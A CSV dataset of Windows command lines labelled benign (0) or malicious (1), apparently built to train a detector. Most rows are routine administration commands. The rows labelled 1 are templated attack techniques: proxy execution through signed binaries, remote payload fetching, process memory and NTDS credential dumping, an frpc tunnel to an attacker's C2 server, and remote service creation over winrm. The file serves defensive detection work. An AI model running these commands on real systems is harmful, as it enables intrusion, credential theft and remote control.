Command,Label
netstat.exe -an,0
ping 192.168.75.129,0
"findstr /C:""pLPh023EGulc"" ""C:\Logs\Logs\rydenetc.log""",0
"del ""C:\Program Files\AppData\loeavrz.ini"" /f /q",0
net user tcimkrxc /add,0
"echo %DATE% %TIME% >> ""D:\Temp\iiubt.dll""",0
net user nijelhcf /add,0
"rmdir.exe ""C:\Users\btjk\Downloads"" /s /q",0
net.exe localgroup Administrators pixvergg /add,0
C:\Windows\certutil.exe -hashfile backup.dat SHA256,0
"certutil.exe -hashfile ""C:\Temp\Program Files\dnlzfak.dll"" SHA256",0
net user omgcghza /add,0
ping.exe 10.0.0.1,0
"findstr.exe /C:""IZ3RboyqNxH1"" ""C:\AppData\zcwcp.sys""",0
"icacls.exe ""D:\Logs\jrlnxmsp.log"" /grant Everyone:F",0
"findstr.exe /C:""K56LPEqCdefw"" ""C:\Logs\zbfuc.ini""",0
C:\Windows\System32\net.exe user mzdgjpvs /add,0
"findstr /C:""6kJQUd1v4l9z"" ""D:\Users\Users\vtrpnfrayr.exe""",0
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,1
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",1
C:\Windows\net.exe user ajthsbxn /add,0
certutil.exe -hashfile config.ini SHA256,0
"type ""D:\Windows\wwpciv.exe""",0
"attrib.exe +h ""D:\Users\ceknij\Downloads\Downloads\sberatw.dll""",0
"dir.exe ""D:\Users\Users""",0
"findstr /C:""WIfn3l7IrEDP"" ""D:\Temp\zhyaymnun.exe""",0
echo cEIxJQn2i7EO > C:\Temp\bjbyduqr.exe,0
ping.exe 192.168.131.195,0
net use Z: \\192.168.142.182\public,0
"C:\Windows\attrib.exe +h ""C:\Users\khoxz.dat""",0
"echo %DATE% %TIME% >> ""C:\Users\AppData\pkgiv.exe""",0
"icacls.exe ""D:\Logs\ibsmfy.dll"" /grant Everyone:F",0
net.exe use Z: \\192.168.18.64\backup,0
fsutil.exe devdrv untrust [/f] C:\Temp\Windows,0
net user hqekknef /add,0
"fsutil.exe file layout ""C:\Users\nyceavt\Pictures\Pictures\ohlmmv.dll""",0
"rmdir ""C:\Temp"" /s /q",0
"move ""C:\AppData\Logs\oywvbu.exe"" ""D:\Logs\gjdqrd.txt""",0
"icacls.exe ""C:\Users\Users\byxlmkxje.dat"" /grant Everyone:F",0
C:\Program Files\arp.exe -a,0
"C:\Windows\echo.exe %DATE% %TIME% >> ""D:\Users\mbqpjfab.dat""",0
"fsutil file layout ""D:\Users\jqxe\Pictures\Downloads\jscmkmvuis.ini""",0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\Temp -Recurse | Select-Object FullName, Length""",0
systeminfo.exe,0
net.exe user tywqoyta /add,0
"type.exe ""D:\Logs\Program Files\eklqxtvb.dat""",0
"rmdir.exe ""D:\Users\gdlsobw\Downloads\Documents"" /s /q",0
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},1
"findstr.exe /C:""oZIfXPk0YyzC"" ""C:\Logs\Temp\vsvufvnecc.txt""",0
"findstr.exe /C:""3buJUNJHRlDb"" ""D:\Users\Program Files\prvik.txt""",0
"copy.exe ""C:\Users\zmcgled.dat"" ""C:\Program Files\rxvkdtepsh.dll""",0
"dir.exe ""C:\Temp\Logs"" /s /b",0
"certutil -hashfile ""C:\Users\qwfesobq.exe"" SHA256",0
cmd.exe /c dir C:\Temp,0
"del ""C:\Logs\ptiivmjf.log"" /f /q",0
"move ""D:\AppData\frglkge.sys"" ""D:\Users\Windows\tjcefsve.dll""",0
echo xqbffVKGZIgi > D:\Logs\AppData\zccsnt.txt,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Logs\AppData -Recurse | Select-Object FullName, Length""",0
"findstr.exe /C:""vMAiZa7apySq"" ""D:\Temp\fitqbuapa.ini""",0
whoami.exe /all,0
net.exe user guest /add,0
"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}",1
net.exe localgroup Administrators jtqulgpo /add,0
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",1
net.exe user uxbzvqcs /add,0
"fsutil.exe file layout ""C:\Windows\sjpgj.sys""",0
"attrib +h ""D:\Windows\Windows\rhiyffoe.dll""",0
Pcwrun.exe /../../$(calc).exe,1
E:\Windows\echo.exe BfVEjADEve7R > C:\Logs\Temp\wmgylpdok.dat,0
"C:\Windows\System32\fsutil.exe file layout ""D:\Temp\Temp\zvbxgd.dll""",0
"icacls ""D:\Logs\Users\htbjyhfh.exe"" /grant Everyone:F",0
net.exe user fhweqtyz /add,0
"certutil -hashfile ""C:\AppData\AppData\aowxv.log"" SHA256",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\mewizr.txt\"" \""C:\AppData\Logs\fkzjqurm.txt\"""" /sc daily /st 23:00",0
ping.exe 192.168.172.83,0
"fsutil.exe file layout ""C:\Users\hljzvqcalv.dll""",0
net localgroup Administrators evfhrzpg /add,0
"powershell.exe -Command ""Get-Service""",0
"C:\Program Files (x86)\powershell.exe -Command ""Get-Service""",0
"type.exe ""C:\Program Files\Program Files\svvbuw.log""",0
"move ""C:\Logs\lckvqbbvx.txt"" ""D:\AppData\Program Files\cultqbg.exe""",0
"C:\Windows\attrib.exe +h ""C:\Users\Temp\eifffbq.log""",0
"powershell.exe -Command ""Get-Process""",0
"rmdir.exe ""C:\Temp\Temp"" /s /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\vqedn.exe\"" \""D:\Windows\wzmzf.dat\"""" /sc daily /st 23:00",0
net user krzimllv /add,0
net.exe user service /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Users\assgzudm.txt\"" \""D:\Users\alnl\Downloads\delpmp.txt\"""" /sc daily /st 23:00",0
"move.exe ""D:\Users\Program Files\osjsr.log"" ""C:\AppData\lcylc.dll""",0
"dir ""D:\Windows\AppData""",0
"powershell.exe -Command ""Get-Service""",0
"echo %DATE% %TIME% >> ""D:\AppData\Logs\epgrvdp.txt""",0
C:\Windows\System32\ping.exe 192.168.225.179,0
diskshadow/set/unexpose {f36d0be6-0c4e-4075-b70d-e153f1fdaa2f | D | <share> | <mountpoint>},0
diskshadow/set/unexpose {1694776d-8fe7-488b-a843-ab11e52e41fe | C | <share> | <mountpoint>},0
"icacls ""C:\AppData\fqwuaobz.sys"" /grant Everyone:F",0
"attrib +h ""D:\Program Files\shybyygx.exe""",0
"reg.exe add ""HKCU\Software\MyTestKey"" /v ""MyValue"" /t REG_SZ /d ""TestData""",0
C:\Windows\System32\ping.exe 192.168.220.186,0
"attrib +h ""C:\Windows\Temp\rbasw.exe""",0
"del ""C:\Users\zrvmnd\Documents\Downloads\nbtkruwj.dat"" /f /q",0
C:\Windows\System32\net.exe user psmxcpwv /add,0
net.exe use Z: \\192.168.16.119\public,0
"del ""C:\Temp\ubtiaktm.sys"" /f /q",0
"C:\Windows\System32\move.exe ""C:\Logs\AppData\aafnlh.log"" ""C:\Logs\bcnfwjvwhf.sys""",0
"D:\Windows\System32\icacls.exe ""C:\AppData\xpoyg.sys"" /grant Everyone:F",0
net use Z: \\192.168.112.38\public,0
"findstr.exe /C:""6DBuPKved6SP"" ""C:\AppData\uszgrsnt.dll""",0
C:\Windows\cmd.exe /c dir C:\Program Files,0
net user puexfzgj /add,0
"C:\Windows\System32\certutil.exe -hashfile ""C:\Logs\tfzso.ini"" SHA256",0
icacls.exe document.txt /grant Everyone:R,0
systeminfo.exe,0
"rmdir.exe ""C:\Windows"" /s /q",0
"del ""C:\Users\cnihae\Pictures\cfcfepcsmt.txt"" /f /q",0
"attrib +h ""C:\Windows\tuoixsbdps.sys""",0
"findstr.exe /C:""FYAcklC8yZro"" ""C:\Temp\Program Files\ogfdkwb.log""",0
net user limybxrr /add,0
net use Z: \\192.168.112.74\data,0
"fsutil.exe file layout ""C:\Windows\mubwjx.dll""",0
"icacls.exe ""C:\Logs\nlcsodnixh.dll"" /grant Everyone:F",0
"icacls ""D:\Logs\Logs\kchhiks.sys"" /grant Everyone:F",0
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,1
"attrib +h ""C:\Temp\Users\kxlstqjxh.exe""",0
"type.exe ""C:\Temp\fcehtm.log""",0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\gdpi\Downloads -Recurse | Select-Object FullName, Length""",0
"type.exe ""C:\Windows\ktfdswu.log""",0
"icacls.exe ""C:\Users\wilrt\Pictures\uhzbmrv.txt"" /grant Everyone:F",0
attributes disk set readonly,0
echo fu5oxAOPJb1L > D:\Program Files\tsndmldyjz.dat,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""C:\Logs\ngolvm.txt""",0
C:\Windows\System32\fsutil.exe volume [dismount] D:\Users,0
ping.exe 192.168.127.189,0
net use Z: \\192.168.106.49\public,0
net use Z: \\192.168.86.28\data,0
C:\Windows\net.exe user fpxioqot /add,0
ping.exe 192.168.250.181,0
"icacls ""D:\Users\sbvnxb\Desktop\viwcanqjb.log"" /grant Everyone:F",0
"findstr.exe /i ""success"" backup.dat",0
"fsutil file layout ""D:\Users\Users\xzxumkjjbs.exe""",0
"move ""D:\Windows\Temp\dxfdsjrakp.exe"" ""D:\Users\ltptqwx\Documents\qvyyxehc.ini""",0
"echo %DATE% %TIME% >> ""D:\Program Files\Program Files\ajyov.txt""",0
"certutil.exe -hashfile ""C:\Temp\Users\ypnjtzzrrd.dll"" SHA256",0
dump64.exe {PID} out.dmp,1
"attrib.exe +h ""D:\Logs\ymgllvn.dat""",0
"powershell -Command ""Get-ChildItem -Path C:\Users\Windows -Recurse | Select-Object FullName, Length""",0
"dir ""C:\Users\hdvo\Pictures\Desktop""",0
systeminfo.exe,0
OneDriveStandaloneUpdater,1
"extend lun [size=1735] [drives=7, [7, ...]] [noerr]",0
"fsutil.exe file layout ""C:\AppData\wvuohtnyf.dat""",0
"icacls ""C:\AppData\dwyoilkq.exe"" /grant Everyone:F",0
net.exe user iszofewj /add,0
"del ""C:\Logs\iwyjc.sys"" /f /q",0
create lun automagic size=405 [noerr],0
"type ""C:\Users\jvfyxi\Desktop\mznosmjvz.ini""",0
"type ""D:\Users\ofhdrgav\Documents\Documents\vqkam.exe""",0
ping.exe 192.168.103.34,0
"move ""C:\AppData\AppData\uezumfxaf.dat"" ""C:\Program Files\mseeiogly.dat""",0
"fsutil file layout ""C:\Users\fnoldpc\Downloads\ninbq.log""",0
C:\Windows\echo.exe syzzRNhc3ZTZ > C:\Windows\cxdyd.txt,0
"move.exe ""C:\Users\Users\nzroifjh.ini"" ""C:\Users\rybucgzx\Desktop\tebnzph.txt""",0
net.exe user guest /add,0
fsutil devdrv clearFiltersAllowed [[/f] C:\Program Files],0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\qsrynzdls.txt\"" \""C:\Temp\zuettbsvlf.sys\"""" /sc daily /st 23:00",0
echo 57piyLC5GvA9 > D:\Temp\zotkuj.exe,0
C:\Program Files\icacls.exe document.txt /grant Everyone:R,0
"icacls.exe ""C:\Users\AppData\vwqtpnixzo.txt"" /grant Everyone:F",0
"attrib +h ""D:\Users\euombdmfqb.exe""",0
"C:\Windows\System32\icacls.exe ""D:\Windows\Temp\ragio.txt"" /grant Everyone:F",0
"C:\Windows\System32\certutil.exe -hashfile ""C:\Users\Users\vpiajuaqp.dll"" SHA256",0
"move.exe ""C:\Temp\slggf.dll"" ""C:\Windows\Logs\pislmhrcea.sys""",0
"fsutil file layout ""C:\Program Files\AppData\lgcoj.txt""",0
"attrib.exe +h ""C:\Users\tjowh\Documents\Pictures\fhhwi.sys""",0
"findstr /C:""by2JDrmmGSAL"" ""C:\Logs\Logs\gwxusvux.exe""",0
net.exe use Z: \\192.168.12.87\public,0
"attrib.exe +h ""D:\Temp\Users\acefzwc.dll""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\AppData\Program Files\zrntdhzmb.sys\"" \""C:\Users\shpmlnsf\Downloads\yrlyhlhnsp.sys\"""" /sc daily /st 23:00",0
"findstr.exe /C:""xLm3XTlXKKQN"" ""D:\Logs\Temp\ncxkikkzyq.ini""",0
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,1
"move ""C:\Users\mgvfv\Documents\xlzxvoxi.txt"" ""D:\Users\Windows\njvkh.exe""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Windows\AppData\looqb.txt\"" \""C:\Logs\iifjj.ini\"""" /sc daily /st 23:00",0
"del ""D:\Temp\oernczupto.dll"" /f /q",0
net.exe localgroup Administrators wsolkthd /add,0
"mkdir.exe ""C:\Windows\Temp""",0
fc /a [/c] [/l] [/lb513] [/n] [/off[line]] [/t] [/u] [/w] [/<nnnn>] [D:][C:\Windows\Temp]<filename1> [D:][C:\Windows\Temp]<filename2>,0
fsutil.exe devdrv query [C:\Windows\Windows],0
"certutil -hashfile ""D:\Program Files\luizugjql.exe"" SHA256",0
net use Z: \\192.168.63.251\backup,0
"copy ""D:\Temp\yzrwfid.dat"" ""C:\AppData\Windows\yfynjf.exe""",0
"del ""D:\Users\zgck\Desktop\Downloads\vhkdtlpzwj.dll"" /f /q",0
"echo.exe %DATE% %TIME% >> ""D:\Logs\Temp\srwbps.dll""",0
"findstr /C:""6qxRLbMkXde3"" ""C:\Program Files\xheuwgrvw.log""",0
"# Establishes a TCP tunnel to the attacker's server
frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>",1
"type.exe ""D:\Windows\hyisife.sys""",0
"powershell.exe -Command ""Get-Process""",0
"attrib +h ""D:\Users\Temp\wvxpluq.log""",0
echo d2AZQwMFm1Hb > D:\Users\Temp\kvntujcww.exe,0
certutil.exe -hashfile backup.dat SHA256,0
net.exe user vyvjeykx /add,0
rem echo Insert new disk in Drive B.,0
net use Z: \\192.168.153.114\backup,0
certutil.exe -hashfile data.log SHA256,0
"move ""D:\AppData\jpivgzbqv.dat"" ""D:\Users\tmbpnoiv\Documents\Documents\eoidok.dat""",0
"echo %DATE% %TIME% >> ""D:\Users\bskaleea\Desktop\Desktop\hxsoq.ini""",0
"certutil -hashfile ""D:\Users\ukeoxy\Desktop\tcvcn.ini"" SHA256",0
net.exe user nowtikpm /add,0
"fsutil file layout ""D:\Users\zieef\Documents\Desktop\btbxobe.log""",0
net user fxamxgoe /add,0
"del ""D:\AppData\bqckqn.sys"" /f /q",0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""C:\AppData\rqiayjbb.ini""",0
"rmdir.exe ""C:\Users\rqwftp\Documents"" /s /q",0
net.exe localgroup Administrators ezhnmrpd /add,0
"C:\Windows\System32\mkdir.exe ""C:\Users\twrpq\Pictures\Downloads""",0
whoami.exe /all,0
fsutil devdrv trust [/f] <volume path>,0
C:\Windows\echo.exe J27fPp5RHgOb > D:\Users\ztgujzli\Desktop\rpbbahkft.dll,0
fsutil usn [enablerangetracking] <volumepath> [options],0
echo bnJoxOti4vRE > D:\Users\pcmg\Pictures\Pictures\zfjgp.exe,0
"fsutil.exe file layout ""D:\Users\Windows\btmyf.ini""",0
"C:\Windows\mkdir.exe ""C:\Program Files\Program Files""",0
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",1
ping.exe 192.168.105.49,0
ping.exe 192.168.108.157,0
"findstr /C:""66xBXX8nMQdi"" ""C:\Windows\Users\lmiqdwrku.exe""",0
Get-EventLog security -instanceid 4624,1
"C:\Windows\echo.exe %DATE% %TIME% >> ""C:\Users\Logs\bnmnchz.log""",0
fsutil.exe volume [filelayout] D:\Users <fileID>,0
"dir ""C:\Logs\AppData"" /s /b",0
"forfiles /S /M *.* /C ""cmd /c echo.exe The extension of @file is 0x09@ext""",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
echo 6d5keXeUzVMc > D:\Windows\wrmptit.txt,0
ping.exe 10.0.0.1,0
net.exe use Z: \\192.168.143.244\data,0
ping.exe 192.168.169.188,0
"fsutil file layout ""D:\Program Files\AppData\acbhmpejg.exe""",0
"move ""C:\Users\nqdfqklz.dll"" ""D:\Program Files\roqyd.exe""",0
"attrib.exe +h ""C:\Program Files\qperuhcfw.dat""",0
echo Nc4xLzVzhqiH > D:\Users\Logs\mnicgm.exe,0
ipconfig.exe /all,0
"D:\Windows\System32\findstr.exe /C:""46ilVQPKSbly"" ""D:\Users\Logs\gogvqrv.sys""",0
"copy ""D:\Users\xfexqdl.log"" ""D:\Windows\yxwxvpetle.txt""",0
"certutil -hashfile ""D:\Temp\leuxaa.dll"" SHA256",0
fsutil.exe devdrv enable /allowAv,0
fsutil.exe usn [enumdata] <fileref> <lowUSN> <highUSN> C:\Logs\Logs,0
net.exe user idxfebga /add,0
"echo.exe %DATE% %TIME% >> ""C:\Logs\Logs\brtjvqpety.ini""",0
"echo %DATE% %TIME% >> ""D:\Windows\notnxut.dll""",0
"certutil -hashfile ""C:\Temp\tixlvbinuh.exe"" SHA256",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\Program Files\nwvlcf.dll\"" \""D:\Logs\Program Files\msrhtjs.exe\"""" /sc daily /st 23:00",0
"attrib.exe +h ""D:\Logs\ujoppvp.dat""",0
ipconfig.exe /all,0
"icacls.exe ""C:\Windows\Windows\qwpveair.log"" /grant Everyone:F",0
"C:\Windows\type.exe ""C:\Program Files\seltg.log""",0
net.exe use Z: \\192.168.137.124\backup,0
"certutil -hashfile ""C:\Temp\Users\smzdfut.dat"" SHA256",0
"icacls ""D:\AppData\ywmbhe.dat"" /grant Everyone:F",0
flattemp /query,0
"rmdir.exe ""D:\Program Files\Users"" /s /q",0
netstat.exe -an,0
arp.exe -a,0
"move.exe ""C:\Users\gqzmx\Desktop\Desktop\aifxqhyqz.log"" ""C:\Users\Logs\hnfnvwhtu.dll""",0
net.exe user owyqsvfy /add,0
tasklist.exe /v,0
net.exe use Z: \\192.168.255.182\data,0
"copy.exe ""D:\Logs\ecoeb.txt"" ""D:\Windows\Windows\afjfdbifr.dll""",0
"C:\Windows\System32\findstr.exe /i ""error"" document.txt",0
"mkdir.exe ""C:\Users\ubtde\Desktop\Desktop""",0
net.exe use Z: \\192.168.63.20\backup,0
C:\Windows\System32\whoami.exe /all,0
"powershell.exe -Command ""Get-Service""",0
"fsutil.exe file layout ""C:\Logs\absbqzee.dat""",0
"D:\Windows\dir.exe ""C:\Logs\Users""",0
Presentationhost.exe {PATH_ABSOLUTE:.xbap},1
"C:\Windows\icacls.exe ""D:\Users\svnlsiswy.ini"" /grant Everyone:F",0
"icacls.exe ""C:\AppData\ebjdlefgk.dll"" /grant Everyone:F",0
attrib.exe +r document.txt,0
net.exe user kepsbcmw /add,0
"del ""D:\Temp\AppData\ucowwwyq.dat"" /f /q",0
"findstr.exe /C:""TADGMfDI3PD0"" ""C:\Program Files\AppData\prjcpbpp.dat""",0
"echo.exe %DATE% %TIME% >> ""C:\Temp\Users\qkejfpnrim.log""",0
"type ""C:\Users\eknlnzmo\Documents\Downloads\prxhgxe.dll""",0
net.exe localgroup Administrators guest /add,0
"fsutil file layout ""C:\Logs\xdlaflzs.dat""",0
whoami.exe /all,0
"del ""C:\Users\Temp\uaxnbccgr.exe"" /f /q",0
"move ""C:\AppData\Logs\ybsxkjfceg.ini"" ""D:\Logs\Windows\xolwwfc.ini""",0
"findstr /C:""xAKswkgQapQC"" ""D:\Windows\aqsthgk.dat""",0
"C:\Windows\System32\type.exe ""C:\Windows\Windows\dhpzrgjpqz.sys""",0
ping.exe 192.168.151.218,0
msiexec /z {PATH_ABSOLUTE:.dll},1
"certutil -hashfile ""D:\Windows\fxawhbe.exe"" SHA256",0
"del ""C:\Program Files\kmizqbqh.exe"" /f /q",0
"rmdir.exe ""D:\Temp\Logs"" /s /q",0
net use Z: \\192.168.148.85\backup,0
"attrib.exe +h ""D:\AppData\kvwxz.log""",0
"dir.exe ""C:\Logs\Users"" /s /b",0
fsutil.exe 8dot3name [query] [D:\Logs\AppData],0
te.exe {PATH:.wsc},1
"dir.exe ""D:\Users\rfor\Downloads\Downloads"" /s /b",0
Volume c: alias System1    GUID \\?\Volume{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Windows\glhsvt.txt\"" \""C:\AppData\nvadej.txt\"""" /sc daily /st 23:00",0
"copy ""D:\Users\xosixbde\Downloads\cqxmqsuqdh.sys"" ""C:\AppData\dhhjle.ini""",0
"move.exe ""C:\Temp\AppData\qvtdoknlym.txt"" ""D:\Program Files\iefsbfun.txt""",0
"powershell -Command ""Get-ChildItem -Path C:\Users\oqnazlp\Downloads\Desktop -Recurse | Select-Object FullName, Length""",0
"mkdir.exe ""D:\Program Files\Temp""",0
net.exe user xdjrwvzq /add,0
"findstr.exe /C:""93vaIfPfv2OR"" ""C:\Program Files\AppData\joqrndmo.ini""",0
ping.exe 192.168.48.95,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\kkhujmcijp.ini\"" \""C:\Temp\AppData\dvbzi.dat\"""" /sc daily /st 23:00",0
expand vdisk maximum=234,0
"C:\Windows\mkdir.exe ""C:\Windows\Program Files""",0
echo.exe EUgpg31tTc6l > D:\Windows\prwufw.dll,0
"attrib +h ""C:\AppData\Temp\wecnpek.dll""",0
for {%% | %}<variable> in (<set>) do <command> [<commandlineoptions>],0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Windows\hequudy.txt\"" \""D:\Users\rkixmmhr\Desktop\pgtjvwdf.log\"""" /sc daily /st 23:00",0
"move.exe ""C:\Program Files\hdwaq.sys"" ""D:\AppData\memyeikun.dat""",0
"icacls.exe ""C:\Temp\zoedbaf.dll"" /grant Everyone:F",0
ipconfig.exe /all,0
name {subsystem | lun | target} [<name>],0
net.exe use Z: \\192.168.196.14\backup,0
"icacls.exe ""D:\Program Files\pprju.log"" /grant Everyone:F",0
net localgroup Administrators zgrmezwg /add,0
"findstr /C:""vFrvVNfliEpC"" ""D:\Windows\Users\waxbfrecn.dat""",0
"icacls.exe ""C:\Users\kztcim\Pictures\Pictures\dszdbvtcr.txt"" /grant Everyone:F",0
net.exe user ncdgymgy /add,0
fsianycpu.exe {PATH:.fsscript},1
"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",1
"copy ""C:\Logs\Temp\rjthjzxkvk.exe"" ""C:\Program Files\galyylajnk.dll""",0
"C:\Windows\System32\type.exe ""D:\Windows\Program Files\cruljsrw.log""",0
"C:\Windows\type.exe ""D:\Users\uqdzsmp\Desktop\Pictures\kgcgyo.log""",0
"copy ""C:\Program Files\ateshbsz.txt"" ""D:\Program Files\kdyjrsqarx.exe""",0
forfiles [/P pathname] [/M searchmask] [/S] [/C command] [/D [+ | -] [{<date> | <days>}]],0
"attrib.exe +h ""D:\Logs\kicvres.txt""",0
C:\Program Files (x86)\net.exe localgroup Administrators user1 /add,0
net.exe use Z: \\192.168.53.26\data,0
"C:\Windows\System32\icacls.exe ""D:\Temp\Users\vcbgi.dat"" /grant Everyone:F",0
ipconfig.exe /all,0
"fsutil file layout ""D:\Logs\rptaah.sys""",0
"C:\Windows\dir.exe ""C:\Program Files\Temp""",0
E:\Windows\System32\echo.exe i5u4lIfHeh0Q > D:\Users\mzgfq\Desktop\Downloads\mihlojifs.sys,0
C:\Program Files (x86)\netsh.exe advfirewall show allprofiles,0
"icacls ""C:\Windows\Program Files\howoqb.exe"" /grant Everyone:F",0
"attrib.exe +h ""C:\Program Files\vyrvkeapqo.log""",0
fsutil.exe devdrv trust [/f] C:\Users,0
net.exe user bduadzcb /add,0
"copy ""C:\Temp\qbikz.dll"" ""D:\AppData\Program Files\rutqvt.sys""",0
"attrib.exe +h ""C:\Users\Logs\hvseeossx.dat""",0
"copy.exe ""D:\Windows\ajnhwyf.sys"" ""C:\Users\crfqrqe\Documents\Pictures\uwxvzqtdl.dat""",0
fsutil.exe devdrv query [D:\Temp],0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\qldj\Pictures\Downloads -Recurse | Select-Object FullName, Length""",0
"rmdir.exe ""C:\Users\srmwtf\Desktop\Documents"" /s /q",0
"rmdir.exe ""C:\Users\budgedul\Pictures\Downloads"" /s /q",0
"del ""C:\AppData\rqrusio.dll"" /f /q",0
net.exe use Z: \\192.168.108.214\data,0
"C:\Program Files (x86)\powershell.exe -Command ""Get-Service""",0
"move.exe ""C:\AppData\fxakxpfbcy.dat"" ""C:\Program Files\Logs\rhkuuoefg.dat""",0
"attrib.exe +h ""D:\Windows\txxdrp.txt""",0
net.exe localgroup Administrators xukxcgzh /add,0
net localgroup Administrators qswwnwrv /add,0
echo.exe HpuMO6lVkR43 > D:\Windows\Logs\fuxsofz.ini,0
"fsutil file layout ""D:\Users\eezltmvd\Pictures\Documents\nczslj.txt""",0
fsutil behavior query {allowextchar | bugcheckoncorrupt | disable8dot3 [C:\Users\AppData] | disablecompression | disablecompressionlimit | disableencryption | disablefilemetadataoptimization | disablelastaccess | disablespotcorruptionhandling | disabletxf | disablewriteautotiering | encryptpagingfile | mftzone | memoryusage | quotanotify | symlinkevaluation | disabledeletenotify},0
cmd.exe /c dir D:\Data,0
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",1
ping 192.168.98.110,0
"(Controller ports active after this command: Ctlr 0 Port 0, Ctlr 0 Port 1)",0
"del ""D:\Windows\AppData\pcgqksyr.log"" /f /q",0
"copy.exe ""D:\Windows\okiimf.dll"" ""C:\Users\gxozezjv\Desktop\Downloads\dmwcygthx.txt""",0
"move ""D:\Users\dhcztbukw.log"" ""D:\Users\Users\vbaqjcdh.ini""",0
"copy.exe ""D:\Windows\Logs\auydfzzwx.sys"" ""C:\Windows\qvkgmknd.log""",0
No Diskshadow aliases in the environment.,0
fsutil.exe reparsepoint [query] <filename>,0
"attrib.exe +h ""C:\Logs\Temp\abxqgigaon.txt""",0
C:\Windows\System32\ping.exe 192.168.160.79,0
add alias <aliasname> <aliasvalue>,0
"rmdir.exe ""D:\Program Files\AppData"" /s /q",0
"dir ""D:\AppData\AppData""",0
"C:\Windows\System32\rmdir.exe ""C:\AppData\Users"" /s /q",0
"move ""D:\Users\exevu\Desktop\Downloads\acqqp.txt"" ""D:\Users\Logs\mlbrtar.exe""",0
Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,1
ping.exe 192.168.66.168,0
net user snniutak /add,0
net localgroup Administrators gtdjcbjn /add,0
ping 192.168.145.149,0
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",1
"echo %DATE% %TIME% >> ""C:\Program Files\nbuqgllzc.dat""",0
"dir.exe ""D:\Users\rqek\Pictures\Documents"" /s /b",0
C:\Windows\net.exe use Z: \\192.168.117.242\backup,0
"C:\Windows\System32\fsutil.exe file layout ""D:\Users\sqbtro.dat""",0
C:\Windows\ipconfig.exe /all,0
icacls.exe backup.dat /grant Everyone:R,0
net.exe user kaxvtftm /add,0
C:\Program Files\ipconfig.exe /all,0
"icacls ""C:\Program Files\hpehiqzi.dat"" /grant Everyone:F",0
